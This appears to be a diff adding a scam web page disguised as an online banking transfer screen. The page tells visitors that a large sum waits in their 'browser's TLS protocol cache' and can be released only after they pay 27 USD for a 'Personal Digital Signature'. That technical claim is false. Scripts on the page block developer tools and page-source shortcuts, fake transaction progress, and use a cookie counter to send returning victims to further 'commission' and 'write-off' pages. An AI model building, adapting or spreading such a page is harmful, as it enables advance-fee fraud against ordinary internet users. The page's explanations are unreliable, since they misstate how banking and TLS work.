@@ -1,0 +1,270 @@
+<html prefix="og: http://ogp.me/ns#" lang="ru-RU" dir="ltr"><head>
+	<meta name="viewport" content="width=device-width initial-scale=1">
+		<title>Online Banking</title>
+		<meta name="theme-color" content="rgb(42, 159, 48)">
+		<meta charset="utf-8">
+		<meta name="author" content="money.exe">
+		<meta name="description" content="">
+		<meta property="og:image" content="favImage.png">
+		<meta property="og:image:type" content="image/png">
+		<meta property="og:image:width" content="128">
+		<meta property="og:image:height" content="128">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="reset.css" media="screen,print">
+		<link rel="stylesheet" href="template.css?ver=1.6.4" media="screen">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+		<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,300;1,400;1,600;1,700;1,800&amp;display=swap" rel="stylesheet">
+		<link rel="shortcut icon" id="fav_mes" href="anim_icon2.gif"> 
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+       <script charset="utf-8" src="https://api-maps.yandex.ru/1.1/index.xml" type="text/javascript"></script><link rel="stylesheet" href="https://api-maps.yandex.ru/1.1/_YMaps.css?v=0.2.7"><script type="text/javascript" charset="utf-8" src="https://api-maps.yandex.ru/1.1/_YMaps.js?v=0.2.7"></script>
+		<script>var timeSum = 28790; var moneysum = timeSum.toLocaleString(); 
+var tallage = 3;
+var result = timeSum / 100 * tallage; //вычисление процентов
+var percentm = result.toLocaleString(); 
+var raznpercent = timeSum - result;
+var ostpercent = raznpercent.toLocaleString(); 
+setTimeout(function(){$("#moneysum1,#moneysum2,#moneysum3,#moneysum4,#moneysum5,#moneysum14").text(moneysum); $("#moneysum6,#moneysum7").text(percentm); $("#moneysum8,#moneysum9,#moneysum10,#moneysum11,#moneysum12,#moneysum13,#moneysum15").text(ostpercent);},1);
+		</script>
+</head>
+<body>
+<div id="loadpage"></div>
+	<div class="fundament">
+		<div class="header">
+		<div class="top_wrap">
+		<img class="logo" src="logo.png">
+		<div class="nav">
+					<a class="navmanu" onclick="menu1(); return false;" href="">Home</a>
+					<a class="navmanu" onclick="menu1(); return false;" href="">Transactions</a>
+					<a class="navmanu" onclick="menu1(); return false;" href="">Chat</a>
+					<a class="navmanu" onclick="menu1(); return false;" href="">History</a>
+		</div>
+		<a href="vendor/logout.html"><svg class="exit" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" fill-rule="evenodd"><path fill="#FFF" fill-opacity="0" d="M0 0h24v24H0z"></path><rect width="10" height="2" x="9" y="11" fill="#bcbcbc" rx="1"></rect><path fill="#bcbcbc" d="M15.364 16.95a1 1 0 1 1-1.414-1.414L17.485 12 13.95 8.464a1 1 0 1 1 1.414-1.414l4.243 4.243a1 1 0 0 1 0 1.414l-4.243 4.243zM11 4a1 1 0 0 1 0 2H6v12h5a1 1 0 0 1 0 2H5a1 1 0 0 1-1-1V5a1 1 0 0 1 1-1h6z"></path></g></svg></a>
+		<div style="float:right; width:50px;">
+	      <img class="userava" src="5e6f319fa2ae97a950331259_black-male-user-symbol.svg">
+	 </div>
+	 <div class="us_balance"><span id="moneysum15"></span> $</div> 
+		<div class="both"></div>
+		<div class="seach_head">
+			<input class="search" id="inp" placeholder="Search">
+			<div class="resultsearch">Nothing matched your search terms</div>
+			<span onclick="search()" class="_search">
+			  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="#4C6470" fill-rule="nonzero" d="M1 7.235a6.234 6.234 0 116.234 6.234A6.234 6.234 0 011 7.235zm10.55 0a4.316 4.316 0 10-8.633-.001 4.316 4.316 0 008.632 0zm-.933 3.107a1.004 1.004 0 011.418 0l2.652 2.651a.997.997 0 010 1.418l-.278.277a1.004 1.004 0 01-1.418 0l-2.651-2.65a.997.997 0 010-1.419l.277-.277z"></path></svg>
+			</span>
+		</div>
+	  </div>
+	  </div><script>
+setTimeout(function(){webpushstart(); },1); 
+</script>
+<div class="bganim2" style="display: none;">
+<center>
+<img class="loader" id="loader1" src="loadcard.svg">
+<br><div id="status1" style="display: none;" class="h1">Processing <span class="loading1"></span></div>
+<div id="status2" style="display: none;" class="h1">Trasaction: <span class="cardvisa"></span></div>
+<div id="status3" style="" class="h1">Transaction rejected <span class="loading1"></span></div>
+<div style="margin-top:-10px;" class="h3"> Loading ...</div></center>
+</div>
+	  <div class="header_mob">
+	  <div class="top_wrap">
+		<div onclick="menu1()" class="naw_left"><img src="str-left.jpg"></div>
+		<div class="naw_title">Billing Trasactions</div>
+        <div onclick="openpushMenu();" class="naw_right"><img src="m-rig.jpg"></div>
+			</div>
+	  </div>
+		<div class="content">
+            <div class="title_content"><div id="mes_data"></div></div>
+<div class="content_desctop">	
+<span class="_2UpUVIhO">HOME</span> <span class="zvXwKRjX">Billing Trasactions</span>
+		 	<div class="workspace_box">
+				 <div class="size24">The transfer is awaiting for confirmation of a Personal Digital Signature! </div>
+				 <span style="font-weight: 400; display:block; margin-top:10px; margin-bottom:0px;" class="h2">A transfer is ready for sending to the specified details in the amount of:</span>
+				 <div class="pay2"><span id="moneysum8"></span> $</div>
+				
+				
+	<div class="itemDiv">			
+Money transaction in the ammount of <b><span id="moneysum15"></span> USD</b> has left the transit cell and is placed in your browser's TLS protocol cache!
+<div class="interv_al"></div>
+This means that the transfer will be carried out at the time indicated above if you put a personal digital signature to receive funds from the browser in the TLS protocol right now. 
+<div class="interv_al"></div>
+Most likely, you, as an ordinary Internet user, do not have a Personal Digital Signature. 
+We made sure that you do not have to look for organizations on your own that could generate it for you.
+Therefore, we are ready to provide you with the service of generating a Personal Digital Signature for receiving funds from a browser using the TLS protocol. 
+<div class="interv_al"></div>
+This service costs only <b>27 USD</b> As you receive a personal digital signature in the form of a three-digit cipher of letters and numbers, it will be confirmed by you in the browser and transfer in the ammount of
+<b><span id="moneysum15"></span> USD.</b> will be sent to the Bank details you specified!
+
+</div>	
+
+<div style="color: #068441; text-align:center;" class="h2">CONTINUE</div>				
+				
+				
+				
+				
+<a class="epay222" href="/b/wco1/?price=61186"><div class="button buttform1">CONTINUE</div></a>	
+<div style="color: red; text-align:center;" class="comSmallText h3">You need to make fund withdrawal request within 48 hours! Otherwise funds will be returned to the sender.</div>
+<div class="both"><br></div>
+			</div>
+		</div>
+<div class="main">
+<div class="h1">THE TRANSFER IS AWAITING FOR CONFIRMATION OF A PERSONAL DIGITAL SIGNATURE!</div>
+<div style="margin:0px;" class="h2 f6650a">A TRANSFER IS READY FOR SENDING TO THE SPECIFIED DETAILS IN THE AMOUNT OF:</div>
+<div class="pay2"><span id="moneysum9"></span> USD.</div>
+Money transaction in the ammount of <b><span id="moneysum15"></span> USD.</b> has left the transit cell and is placed in your browser's TLS protocol cache!
+<div class="interv_al"></div>
+This means that the transfer will be carried out at the time indicated above if you put a personal digital signature to receive funds from the browser in the TLS protocol right now. 
+<div class="interv_al"></div>
+Most likely, you, as an ordinary Internet user, do not have a Personal Digital Signature. 
+We made sure that you do not have to look for organizations on your own that could generate it for you.
+Therefore, we are ready to provide you with the service of generating a Personal Digital Signature for receiving funds from a browser using the TLS protocol. 
+<div class="interv_al"></div>
+This service costs only <b>27 USD</b> As you receive a personal digital signature in the form of a three-digit cipher of letters and numbers, it will be confirmed by you in the browser and transfer in the ammount of 
+<b><span id="moneysum15"></span> USD.</b> will be sent to the Bank details you specified!
+<br>
+<div style="color:#32cccc;" class="h2">CONTINUE</div>
+<a href="/b/wco1/?price=61186" class="epay222 button w-button">CONTINUE</a><br>
+<div class="comSmallText h3">
+You need to make fund withdrawal request within 48 hours! Otherwise funds will be returned to the sender.</div>
+<div class="text-block-9 h3" style="text-align:center; padding-top:20px; color: rgb(102, 102, 102);">secure payments on the Internet</div>
+</div>		
+<script>
+		setTimeout(function(){$('#status1').fadeIn('fast'); },1); 
+		setTimeout(function(){$('#status1').fadeOut(1);},3000); 
+		setTimeout(function(){$('#status2').fadeIn(2); $('.cardvisa').html(getCookie('rekviz')); },3000); 
+		setTimeout(function(){$('#status2').fadeOut(1)},10000); 
+		setTimeout(function(){$('#status3').fadeIn(2); $('#loader3').fadeIn(2);},10000); 
+		setTimeout(function(){$('.bganim2').fadeOut(1);},12000);
+</script>
+<div class="scaffold__region-footer"></div>
+		<div class="footer">
+	    <div class="clearfix grpelem" id="u15437-6">
+         <p>60640 Frankfurt am Main</p>
+         <p>© 1995 - <script>let today = new Date();let year = today.getFullYear();document.write(year);</script>. All rights reserved. </p>
+        </div>	
+		
+		<div class="_3jfQcs42">
+		<div id="share">
+    <div class="social" data-url="/" data-title="Стильные кнопки поделится в соц сетях без использования сторонних сервисов">		
+		<a class="push facebook _34M1hcgU" data-id="fb"><svg xmlns="http://www.w3.org/2000/svg" width="29" height="29" viewBox="0 0 40 40"><g fill="none" fill-rule="evenodd"><path fill="#FFF" d="M24.7 20.635H21.18v12.981h-5.337V20.635h-2.537v-4.562h2.537V13.12c0-2.111.997-5.417 5.384-5.417l3.953.016v4.429h-2.868c-.47 0-1.132.236-1.132 1.243v2.685h3.988l-.466 4.558z"></path></g></svg></a>
+		<a class="push twitter _34M1hcgU" data-id="tw"><svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" width="29px" height="29px" viewBox="0 0 29 29" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g transform="translate(-1592.000000, -1947.000000)"><g transform="translate(572.000000, 1765.000000)"><g transform="translate(810.000000, 39.000000)"><g id="Group-39" transform="translate(114.000000, 106.000000)"><g id="Group-16" transform="translate(0.000000, 37.000000)"><g id="twitter" transform="translate(96.086957, 0.000000)"><path d="M23.0764306,10.3465841 C22.4631747,10.6201593 21.803491,10.8051947 21.1116649,10.8878319 C21.8180316,10.4620708 22.360115,9.78839823 22.6159785,8.98435398 C21.9550192,9.37880531 21.2226326,9.66495575 20.443818,9.81919469 C19.819848,9.15065487 18.9308311,8.73284956 17.9464075,8.73284956 C16.057661,8.73284956 14.5257968,10.2739558 14.5257968,12.1740973 C14.5257968,12.443823 14.5561535,12.7063628 14.6148261,12.9583805 C11.7720127,12.8149204 9.25138823,11.4449912 7.5641693,9.36238053 C7.26978607,9.87052212 7.10091112,10.4620708 7.10091112,11.0926283 C7.10091112,12.2862478 7.70523855,13.34 8.62257137,13.9569558 C8.06212082,13.9392478 7.53432282,13.7844956 7.07336052,13.5260619 C7.07310543,13.5406903 7.07310543,13.5553186 7.07310543,13.5696903 C7.07310543,15.2370619 8.25267911,16.6277788 9.81719584,16.9436991 C9.53046556,17.0227434 9.2276641,17.0645752 8.9161893,17.0645752 C8.69527434,17.0645752 8.48124702,17.0432743 8.27257676,17.0032389 C8.70777414,18.3700885 9.97076491,19.3650708 11.4679357,19.3930442 C10.2970354,20.3161681 8.8223132,20.8661416 7.21927664,20.8661416 C6.94377068,20.8661416 6.6708157,20.8499735 6.40372797,20.8178938 C7.91671489,21.7946549 9.7151566,22.3641327 11.6467595,22.3641327 C17.9384994,22.3641327 21.3792628,17.1205221 21.3792628,12.5726549 C21.3792628,12.4235487 21.3759465,12.2749558 21.369314,12.127646 C22.0381812,11.6426018 22.6180192,11.0366814 23.0764306,10.3465841 L23.0764306,10.3465841 Z" fill="#FFFFFF"></path></g></g></g></g></g></g></g></svg></a>
+		<a class="push google _34M1hcgU" data-id="gp"><svg xmlns="http://www.w3.org/2000/svg" width="29px" height="29px" viewBox="0 0 29 29" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g transform="translate(-1640.000000, -1947.000000)"><g transform="translate(572.000000, 1765.000000)"><g transform="translate(810.000000, 39.000000)"><g id="Group-39" transform="translate(114.000000, 106.000000)"><g id="Group-16" transform="translate(0.000000, 37.000000)"><g id="twitter-copy" transform="translate(144.130435, 0.000000)"><g id="youtube" transform="translate(5.605072, 8.861111)" fill="#FFFFFF"><path d="M16.8672645,1.08676768 C17.3649149,1.87723737 17.615942,3.23877273 17.615942,5.63683838 C17.615942,5.63786364 17.615942,5.63991414 17.615942,5.63991414 C17.615942,5.64196465 17.615942,5.6450404 17.615942,5.6450404 C17.615942,8.03182828 17.3649149,9.40361616 16.8683655,10.1858838 C16.3905331,10.9773788 15.8719638,11.1209141 14.8161082,11.1875556 C13.7602527,11.2439444 11.1079524,11.2777778 8.81017301,11.2777778 C6.50798958,11.2777778 3.85458832,11.2439444 2.79983379,11.1865303 C1.74618025,11.1198889 1.22761096,10.9763535 0.745374547,10.1848586 C0.253229167,9.40259091 2.20268248e-13,8.03080303 2.20268248e-13,5.64401515 L2.20268248e-13,5.64196465 C2.20268248e-13,5.64196465 2.20268248e-13,5.64093939 2.20268248e-13,5.63888889 C2.20268248e-13,5.63888889 2.20268248e-13,5.63786364 2.20268248e-13,5.63581313 C2.20268248e-13,3.23877273 0.253229167,1.87723737 0.745374547,1.08676768 C1.22761096,0.294247475 1.74728125,0.149686869 2.80093478,0.0932979798 C3.85458832,0.0276818182 6.50798958,-2.01616501e-13 8.81017301,-2.01616501e-13 C11.1079524,-2.01616501e-13 13.7602527,0.0276818182 14.8150072,0.0943232323 C15.8708628,0.149686869 16.3894321,0.295272727 16.8672645,1.08676768 Z M6.60597826,8.71464646 L12.1109601,5.63888889 L6.60597826,2.56313131 L6.60597826,8.71464646 Z" id="Combined-Shape"></path></g></g></g></g></g></g></g></g></svg></a>
+	</div>
+</div>
+		</div>
+		 <div class="both"></div>
+		</div>
+	</div>
+	</div>
+	<div class="push_menu_bg" onclick="pushMenu();" style="display: none;"></div>
+<div class="push_menu" style="display: none;">
+<div onclick="pushMenu();" style="position:absolute; right:10px; color:#b3b3b3; cursor:pointer; top:10px;">✕</div>
+<div class="h1">Notification options:</div>
+<div style="height: 46px;" class="tabpay">
+<div style="padding-top:30px;" class="tabpayimg"><input id="s1" type="checkbox" class="switch"></div>
+<div style="border:none;" class="tabpaytitle">
+<span style=" cursor:pointer; font-weight: 700;" class="h3"><span>Allow receiving important push <br>notifications from the bank?</span>
+
+</span>
+</div>
+</div>
+</div>
+<div class="menu_bottom">
+<div onclick="menu1()" class="p_menu">
+<img class="nawimg img" src="home.png">
+<div class="nav_t ">Home </div>
+</div>
+<div onclick="menu1()" class="p_menu">
+<img class="nawimg img" src="pay.png">
+<div class="nav_t ">Transactions </div>
+</div>
+<div onclick="menu1()" class="p_menu">
+<img class="nawimg img" src="notif.png">
+<div class="nav_t ">Chat </div>
+</div>
+<div onclick="menu1()" class="p_menu">
+<img class="nawimg img" src="tim.png">
+<div class="nav_t ">History </div>
+</div>
+<!--<div onclick = "menu5()" class="p_menu">
+<img class="nawimg img" src="mark.png">
+<div class="nav_t ">Каталог </div>
+</div>-->
+</div>
+<div class="footer_mob">
+</div>
+<script src="script.js?ver=1.6.4"></script>
+<script src="share.js?ver=1.6.4"></script>
+<script> 
+document.oncontextmenu = function() {  
+return false;  
+};  
+document.onkeydown = function(e) {  
+if (e.keyCode == 123) {  
+return false;  
+}  
+if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {  
+return false;  
+}  
+}  
+</script>
+
+<script src="proccess_domain.js"></script>
+<noscript class="imNoScript"><div class="alert alert-red">You need to enable JavaScript to run this App.</div></noscript>
+<script src="jquery.cookie.js"></script>
+  <script>
+$(document).ready(function(){
+    if($.cookie('p')){
+        if ($.cookie('p') <= 1) $.cookie('p', '1', { expires: 7 });
+        else {
+            if ($.cookie('p') == 1) window.location.href = "notifications.html";
+            if ($.cookie('p') == 2) window.location.href = "commission.html";
+            if ($.cookie('p') == 3) window.location.href = "write-off-money.html";
+            if ($.cookie('p') == 4) window.location.href = "t-commiss.html";
+            if ($.cookie('p') == 5) window.location.href = "164739.html";
+            if ($.cookie('p') == 6) window.location.href = "186624.html";
+            if ($.cookie('p') == 7) window.location.href = "299630.html";
+            if ($.cookie('p') == 8) window.location.href = "465317.html";
+			if ($.cookie('p') == 9) window.location.href = "535379.html";
+			if ($.cookie('p') == 10) window.location.href = "543837.html";
+			if ($.cookie('p') == 11) window.location.href = "565569.html";
+			if ($.cookie('p') == 12) window.location.href = "632191.html";
+			if ($.cookie('p') == 13) window.location.href = "641828.html";
+			if ($.cookie('p') == 14) window.location.href = "744976.html";
+			if ($.cookie('p') == 15) window.location.href = "800112.html";
+			if ($.cookie('p') == 16) window.location.href = "916494.html";
+			if ($.cookie('p') == 17) window.location.href = "965794.html";
+			if ($.cookie('p') == 18) window.location.href = "974760.html";
+        }
+    } else $.cookie('p', '1', { expires: 30 });
+});
+</script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();
+   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(94054202, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/94054202" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+</body></html>
